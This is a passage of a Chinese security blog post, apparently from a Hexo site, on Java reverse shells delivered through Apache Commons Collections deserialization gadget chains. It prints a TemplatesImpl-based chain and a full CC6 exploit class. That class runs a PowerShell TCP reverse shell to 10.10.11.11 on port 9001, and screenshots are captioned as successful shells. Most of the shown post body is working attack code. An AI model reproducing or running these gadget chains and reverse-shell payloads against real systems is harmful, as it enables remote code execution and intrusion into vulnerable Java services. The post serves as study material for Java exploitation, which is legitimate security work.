class="hljs-keyword">void</span> <span class="hljs-title function_">setFiled</span><span class="hljs-params">(Object obj, String filedName, Object value)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        Class&lt;?&gt; clazz = obj.getClass();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> clazz.getDeclaredField(filedName);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(obj, value);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">byte</span>[] evilBytes = getEvil();<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        setFiled(templates, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;evil&quot;</span>);<br>        setFiled(templates,<span class="hljs-string">&quot;_bytecodes&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;evilBytes&#125;);<br>        Transformer[] transformers = &#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(TrAXFilter.class),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InstantiateTransformer</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Templates.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;templates&#125;)<br>        &#125;;<br>        <span class="hljs-type">Transformer</span> <span class="hljs-variable">transformerChain</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">lazyMap</span> <span class="hljs-operator">=</span> LazyMap.decorate(<span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>(), <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(<span class="hljs-literal">null</span>));<br>        <span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">tiedMapEntry</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(lazyMap, <span class="hljs-string">&quot;lingx5&quot;</span>);<br>        HashMap&lt;Object, Object&gt; hashMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        hashMap.put(tiedMapEntry, <span class="hljs-string">&quot;1&quot;</span>);<br>        setFiled(lazyMap, <span class="hljs-string">&quot;factory&quot;</span>, transformerChain);<br>        lazyMap.remove(<span class="hljs-string">&quot;lingx5&quot;</span>);<br><br>        <span class="hljs-comment">// 序列化</span><br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">baos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(baos);<br>        oos.writeObject(hashMap);<br>        <span class="hljs-comment">// 反序列化</span><br>        <span class="hljs-type">InputStream</span> <span class="hljs-variable">bais</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(baos.toByteArray());<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(bais);<br>        ois.readObject();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>执行</p>
+<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250803214227652.png" srcset="/img/loading.gif" lazyload alt="image-20250803214227652"></p>
+<p>成功反弹</p>
+<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250803212640437.png" srcset="/img/loading.gif" lazyload alt="image-20250803212640437"></p>
+<p>CC4的利用方法也是一样的</p>
+<h3 id="命令执行（CC1-CC6）"><a href="#命令执行（CC1-CC6）" class="headerlink" title="命令执行（CC1&#x2F;CC6）"></a>命令执行（CC1&#x2F;CC6）</h3><p>这里以CC6为例吧，其实很简单了，就是用Runtime的exec执行命令</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.lingx5.windows;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CC6RevShell</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFiled</span><span class="hljs-params">(Object obj, String filedName, Object value)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        Class&lt;?&gt; clazz = obj.getClass();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> clazz.getDeclaredField(filedName);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(obj, value);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">ip</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&#x27;10.10.11.11&#x27;&quot;</span>;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">port</span> <span class="hljs-operator">=</span> <span class="hljs-number">9001</span>;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">cmd</span> <span class="hljs-operator">=</span><br>                <span class="hljs-string">&quot;powershell.exe $client = New-Object System.Net.Sockets.TCPClient(&quot;</span>+ip+<span class="hljs-string">&quot;,&quot;</span>+port+<span class="hljs-string">&quot;);&quot;</span> +<br>                <span class="hljs-string">&quot;$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%&#123;0&#125;;while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)&#123;;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2  = $sendback + &#x27;PS &#x27; + (pwd).Path + &#x27;&gt; &#x27;;$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()&#125;;$client.Close()&quot;</span>;<br>        Transformer[] transformers = &#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;,<br>                        <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>,<span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;,<br>                        <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>,<span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;,<br>                        <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;cmd&#125;)<br>        &#125;;<br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">lazyMap</span> <span class="hljs-operator">=</span> LazyMap.decorate(<span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>(), <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(<span class="hljs-literal">null</span>));<br>        <span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">tiedMapEntry</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(lazyMap, <span class="hljs-string">&quot;lingx5&quot;</span>);<br>        HashMap&lt;Object, Object&gt; hashMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        hashMap.put(tiedMapEntry, <span class="hljs-string">&quot;1&quot;</span>);<br>        setFiled(lazyMap, <span class="hljs-string">&quot;factory&quot;</span>, chainedTransformer);<br>        lazyMap.remove(<span class="hljs-string">&quot;lingx5&quot;</span>);<br><br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">baos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(baos);<br>        oos.writeObject(hashMap);<br><br>        <span class="hljs-type">InputStream</span> <span class="hljs-variable">bais</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(baos.toByteArray());<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(bais);<br>        ois.readObject();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>成功反弹</p>
+<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250803215056257.png" srcset="/img/loading.gif" lazyload alt="image-20250803215056257"></p>
+<p>另外还有fastjson的一些连以及CB链都可以实现，这里就不一一列举了，思路都是一样的</p>
+<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a target="_blank" rel="noopener" href="https://f5.pm/go-19610.html">Java Runtime.getRuntime().exec 由表及里</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/eb41a0291123">Java Runtime.exe() 执行命令与反弹 shell（上） - 简书</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/ae3922db1f70">Java Runtime.exe() 执行命令与反弹 shell（下） - 简书</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.javasec.org/javase/CommandExecution/">https://www.javasec.org/javase/CommandExecution/</a></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/java%E5%AE%89%E5%85%A8/" class="category-chain-item">java安全</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/java%E5%AE%89%E5%85%A8/" class="print-no-link">#java安全</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>javaRveShell详解</div>
+      <div>http://lingx5.github.io/2025/08/03/javaRveShell详解/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>lingx5</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2025年8月3日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2025/07/19/HTB-cat-%E9%9D%B6%E6%9C%BA/" title="HTB-cat 靶机">
+                        <span class="hidden-mobile">HTB-cat 靶机</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments" lazyload>
+      
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a>
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="busuanzi_container_site_pv" style="display: none">
+        总访问量 
+        <span id="busuanzi_value_site_pv"></span>
+         次
+      </span>
+    
+    
+      <span id="busuanzi_container_site_uv" style="display: none">
+        总访客数 
+        <span id="busuanzi_value_site_uv"></span>
+         人
+      </span>
+    
+    
+
+  
+
+</div>
+
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
